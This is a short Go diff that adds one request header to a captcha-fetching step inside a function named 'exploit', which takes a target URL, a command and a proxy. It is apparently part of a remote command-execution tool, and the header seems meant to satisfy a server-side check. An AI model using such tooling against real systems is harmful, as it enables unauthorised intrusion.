@@ -175,6 +175,7 @@ func exploit(url string, command string, proxyURL string) bool {
 	captchaResp, _ := client.R().
 		SetHeader("User-Agent", userAgent).
 		SetHeader("Referer", referURL).
+		SetHeader("HTTP_SEC_FETCH_DEST", "frame").
 		Get(captchaURL)
 
 	if captchaResp.StatusCode() == 200 && captchaResp.Header().Get("Content-Type") == "image/jpeg" {
